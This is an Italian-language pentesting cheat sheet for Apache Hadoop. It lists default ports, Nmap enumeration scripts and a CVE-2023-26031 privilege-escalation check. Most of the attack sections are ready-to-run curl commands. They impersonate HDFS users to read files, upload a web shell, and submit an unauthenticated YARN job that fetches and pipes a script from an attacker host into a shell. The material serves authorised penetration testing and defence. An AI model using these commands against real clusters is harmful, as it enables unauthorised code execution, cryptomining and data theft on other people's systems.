# 50030-50060-50070-50075-50090 - Pentesting Hadoop

{{#include ../banners/hacktricks-training.md}}

## **Informazioni di base**

**Apache Hadoop** è un **framework open-source** per lo **storage distribuito e l'elaborazione** di **dataset di grandi dimensioni** su **cluster di computer**. Usa **HDFS** per lo storage e **MapReduce** per l'elaborazione.

Porte predefinite utili:

- **50070 / 9870** NameNode (WebHDFS)
- **50075 / 9864** DataNode
- **50090** Secondary NameNode
- **8088** YARN ResourceManager web UI & REST
- **8042** YARN NodeManager
- **8031/8032** YARN RPC (spesso dimenticate e ancora senza auth in molte installazioni)

Purtroppo Hadoop non ha supporto nel framework Metasploit al momento della documentazione. Tuttavia, puoi usare i seguenti **Nmap scripts** per enumerare i servizi Hadoop:

- **`hadoop-jobtracker-info (Port 50030)`**
- **`hadoop-tasktracker-info (Port 50060)`**
- **`hadoop-namenode-info (Port 50070)`**
- **`hadoop-datanode-info (Port 50075)`**
- **`hadoop-secondary-namenode-info (Port 50090)`**

È importante notare che **Hadoop funziona senza autenticazione nella sua configurazione di default**. Tuttavia, per una maggiore sicurezza, sono disponibili configurazioni per integrare Kerberos con i servizi HDFS, YARN e MapReduce.

## WebHDFS / HttpFS abuso (50070/9870 o 14000)

Quando **security=off** puoi impersonare qualsiasi utente con il parametro `user.name`. Alcune primitive rapide:
```bash
# list root directory
curl "http://<host>:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"

# read arbitrary file from HDFS
curl -L "http://<host>:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"

# upload a web shell / binary
curl -X PUT -T ./payload "http://<host>:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs" -H 'Content-Type: application/octet-stream'
```
Se HttpFS è abilitato (porta predefinita **14000**) si applicano gli stessi percorsi REST. Dietro Kerberos puoi comunque usare `curl --negotiate -u :` con un ticket valido.

## YARN unauth RCE (8088)

La **ResourceManager REST API** accetta sottomissioni di job senza autenticazione nella modalità predefinita “simple” (`dr.who`). Gli attaccanti la sfruttano per eseguire comandi arbitrari (es. miners) senza bisogno di accesso in scrittura a HDFS.
```bash
# 1) get an application id
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps/new-application

# 2) submit DistributedShell pointing to a command
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps \
-H 'Content-Type: application/json' \
-d '{
"application-id":"application_1234567890000_0001",
"application-name":"pwn",
"am-container-spec":{
"commands":{"command":"/bin/bash -c \"curl http://attacker/p.sh|sh\""}
},
"application-type":"YARN"
}'
```
Se la porta **8031/8032 RPC** è esposta, i cluster più vecchi permettono lo stesso invio di job via protobuf senza auth (documentato in diverse campagne di cryptominer) – tratta anche quelle porte come RCE.

## Local PrivEsc da YARN containers (CVE-2023-26031)

Hadoop 3.3.1–3.3.4 **container-executor** carica libs da un **RUNPATH relativo**. Un utente che può eseguire YARN containers (inclusi remote submitters su cluster non sicuri) può depositare un `libcrypto.so` malevolo in un percorso scrivibile e ottenere **root** quando `container-executor` viene eseguito con SUID.

Verifica rapida:
```bash
readelf -d /opt/hadoop/bin/container-executor | grep 'RUNPATH\|RPATH'
# vulnerable if it contains $ORIGIN/:../lib/native/
ls -l /opt/hadoop/bin/container-executor   # SUID+root makes it exploitable
```
Risolto in **3.3.5**; assicurarsi che il binario non sia SUID se non sono richiesti container sicuri.

## Riferimenti

- [Apache Hadoop official CVE list](https://hadoop.apache.org/cve_list.html)
- [Wiz write-up on CVE-2023-26031](https://www.wiz.io/vulnerability-database/cve/cve-2023-26031)

{{#include ../banners/hacktricks-training.md}}
